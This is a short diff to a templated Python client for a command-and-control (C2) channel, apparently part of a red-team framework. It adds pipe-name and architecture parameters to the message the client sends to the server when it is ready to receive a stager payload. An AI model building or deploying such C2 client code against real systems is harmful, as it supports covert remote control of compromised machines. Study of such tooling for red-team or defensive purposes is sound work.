@@ -34,6 +34,9 @@ from ast import literal_eval
 C2_BLOCK_TIME = int(```[var:::c2_block_time]```)
 CDLL_NAME = ```[var:::cdll_name]```
 CLIENT_ID = ```[var:::client_id]```
+PIPE_NAME = ```[var:::c2_pipe_name]```
+C2_ARCH = ```[var:::c2_arch]```
+
 
 maxlen = 1024 * 1024
 lib = CDLL(CDLL_NAME)
@@ -82,7 +85,7 @@ def task_decode(task):
 def notify_server():
 	print "Notifying server that we're ready for a stager"
 	# Construct the data frame
-	notification_data_frame = [CLIENT_ID, task_encode(str(C2_BLOCK_TIME))]
+	notification_data_frame = [CLIENT_ID, task_encode(str([str(C2_BLOCK_TIME), PIPE_NAME, C2_ARCH]))]
 	print "notification_data_frame: "
 	preped_notify_data_frame = task_encode(str(notification_data_frame))
 	send_server_notification(preped_notify_data_frame)
